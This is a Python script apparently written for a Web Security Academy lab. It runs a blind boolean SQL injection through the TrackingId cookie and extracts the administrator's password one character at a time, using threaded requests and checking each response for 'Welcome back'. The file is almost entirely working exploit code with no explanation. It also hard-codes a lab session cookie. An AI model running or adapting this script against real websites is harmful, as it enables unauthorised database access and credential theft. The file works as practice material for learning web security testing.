import requests
import concurrent.futures

#7v2e1aee90uiwvxjn0au
payload_len = "yHtqlzhOKKfZZsjE' and (select LENGTH(password) from users where username='administrator')={} --"
payload = "yHtqlzhOKKfZZsjE' and (select substr(password, {},1) from users where username='administrator')='{}' --"
values = ['a', 'b', 'c', 'd', 'e', 'f', 'g', 'h', 'i', 'j', 'k', 'l', 'm', 'n', 'o', 'p','q', 'r', 's', 't', 'u', 'v', 'w', 'x', 'y', 'z', '0', '1', '2', '3', '4', '5', '6', '7', '8', '9']
def send_request_confirm(length):
    print("Starting with length {}".format(length))
    response = requests.get(url="https://0a1b0077033af00980be9e9e001900fb.web-security-academy.net/login", cookies={
        "TrackingId": payload_len.format(length),
        "session": "9Y3uRSdZdk5zofiT2ygH7EUILMmtIWnE"
    })
    if ("Welcome back" in str(response.content)): 
        print("Length is {}".format(length))
        print(response.content)

def send_request_confirm_pass(length, character):
    print("Starting with length {} and character {}".format(length, character))
    response = requests.get(url="https://0a1b0077033af00980be9e9e001900fb.web-security-academy.net/login", cookies={
        "TrackingId": payload.format(length, character),
        "session": "9Y3uRSdZdk5zofiT2ygH7EUILMmtIWnE"
    })
    if ("Welcome back" in str(response.content)): 
        print("Length is {} and character {}".format(length, character))
        print(response.content)


with concurrent.futures.ThreadPoolExecutor(max_workers=4) as tf:
    # results = [tf.submit(send_request_confirm, i) for i in range(35)]
    results = [[tf.submit(send_request_confirm_pass, j, values[i]) for i in range(len(values))] for j in range(1,21)]